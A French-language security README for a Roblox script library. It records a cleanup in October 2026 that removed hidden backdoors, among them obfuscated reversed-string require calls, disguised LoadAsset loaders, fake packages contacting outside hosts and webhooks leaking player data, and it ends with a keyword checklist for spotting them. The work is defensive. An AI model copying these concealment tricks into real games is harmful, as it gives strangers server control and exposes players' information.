# Sécurité de la lib – à lire avant d'ouvrir un jeu

Dernier scan complet : **18/10/2026** – tout `Downloads\rblx` (3 306 fichiers, ~28 600 scripts lus un par un).
Recherche : `require(ID)` (même caché à l'envers / dans un UICorner / derrière des espaces), getfenv/setfenv, loadstring,
InsertService:LoadAsset, HttpService, webhooks Discord, faux packages Wally, faux scripts de weld, IDs admin d'inconnus.

## ✅ Nettoyé le 18/10/2026 (40 fichiers modifiés, tous les scripts touchés recompilés et vérifiés)

Chaque morceau retiré est marqué `[SECURITE]` ou `retire par securite` dans le script → Ctrl+Shift+F dans Studio pour les retrouver.

| Backdoor / fuite | Où (lib + copies brutes à la racine) | Ce qui a été fait |
|---|---|---|
| `getfenv()[string.reverse("eriuqer")](91638724979309)` caché dans un faux PerfectionWeld, actif seulement en serveur live | kits/Templates/Don't Steal From Brainrots [ CMDR ] **(nettoye)** (ex-`_BACKDOOR_…`) | require retiré, fichier renommé |
| `require(6788743652)` « Auto Script Sync / Do Not Remove » (4 scripts) + `require(4793498243)` | HatchingSimulator (+ Top Clicks, Systems) | retirés |
| `require(6214908441)` caché dans un UICorner | CashgrabBridgeEU | retiré |
| Faux « Wally Package » qui contacte `packages.ligma.wtf` (3 copies) | CashgrabBridgeEU | scripts vidés |
| Faux weld qui appelle `assetdelivery.org` | CashgrabBridgeEU | bloc retiré |
| Chargeur déguisé `LoadAsset(4272484885)` (« animationID ») | CashgrabBridgeEU + models (Owner, modèle sans nom, NPC_Characters) | ligne retirée |
| `require(5182026494)` « Studio_Detection » | Tweeting Simulator | retiré |
| `require(306895131)` (Kohl's caché derrière des espaces), `343254562`, `191816425`, `581150091` | Billionaire_Tycoon | retirés (chasse d'eau, couteau, segway ne marchent plus) |
| Auto-update Go! `LoadAsset(160627755)` qui remplace son propre code | Zednov Tycoon Kit (models + ByType + Billionaire) | désactivé |
| `require(1868400649)` Kohl's Admin | Robot Simulator | retiré (plus d'admin Kohl's dans ce jeu) |
| `require(11370150761 / 11370294847 / 10599737239)` tableaux de dons | First_Donations (+ Boards, Systems) | retirés (les tableaux ne s'affichent plus) |
| **Webhooks Discord actifs** d'inconnus (joins, achats, avis, commandes admin…) | CandyRot (8), Tapping Lords, Robot Sim, Tweeting, Pet Pharmica, +1Health, 1Jump, EggPreview (ui/FromGames), FeedbackSystem_Lunor | URL vidées (`""`) → mets TON webhook si tu veux les logs |
| IDs/pseudos admin d'inconnus en dur | Lib_F2AdminButton, FakeVerify, OwnerTag_Fares, AnnounceGlobal_V1.2, Eventos y suerte GUI, ADMIN PANEL | listes vidées → **mets ton UserId** dedans |
| Anciennes neutralisations qui cassaient la syntaxe (`nil --[[...]].Parent = …`) | Boards, Top Clicks, HatchingSimulator_Systems | réparées, scripts recompilent |

## ⚠️ Pas des backdoors, mais à savoir

- **Gardés car officiels** : DataStore2 `require(1936396537)`, HD Admin `require(3239236979)`, Nexus VR `require(10728814921)`, Kohl's Admin + F3X dans ui/Icons/Icons_gtasixseven.rbxl (retire-les si tu ne veux que les icônes).
- **Tweeting Simulator** lit une liste de codes sur Pastebin toutes les 6 min (données seulement, pas de code exécuté).
- **BloxbizSDK** (+1Health / 1Jump) : SDK de pub qui envoie des stats à Bloxbiz.
- **Find The Template** : `WebhookService` prêt à poster sur l'URL que TU configures.
- **models/VFX/Auras** (SemiiDev) : licence « apprendre seulement », interdit dans tes jeux.
- **Lib_Loading_Pazze** : commentaire insultant dans `Handler` → à supprimer avant publication.
- Jeux décompilés/leak (CandyRot, Candy Escape, Steal An Egg Leak/DE, PU - Royale…) → référence uniquement, ne pas republier.
- SpookyEgg : le « UI Pack » de @giffelmissen n'a volontairement pas été repris (script obfusqué menaçant, voir packs/LISEZMOI_PACKS.md).
- **Archives non modifiées** : `rblx/_maj/lib_update.part*` (ancienne mise à jour déjà installée) contient encore les vieilles copies → à supprimer. Les zips de tes projets (GrowAPlanet, RakeForBrainrots) sont propres.

## Règle
- Ce qui donne accès à ton **compte** Roblox ne passe pas par un script de jeu (les scripts n'ont pas accès à ton cookie/mot de passe). Les backdoors trouvées donnent le contrôle du **jeu** (exécuter du code sur le serveur, admin, kick, arnaques aux achats) et les webhooks font **fuiter les infos des joueurs** vers le Discord d'un inconnu.
- Avant d'utiliser un modèle trouvé : Ctrl+Shift+F dans Studio → cherche `require(`, `getfenv`, `loadstring`, `webhook`, `LoadAsset`, `HttpService`.
- Ne publie jamais un jeu de `games/` tel quel.
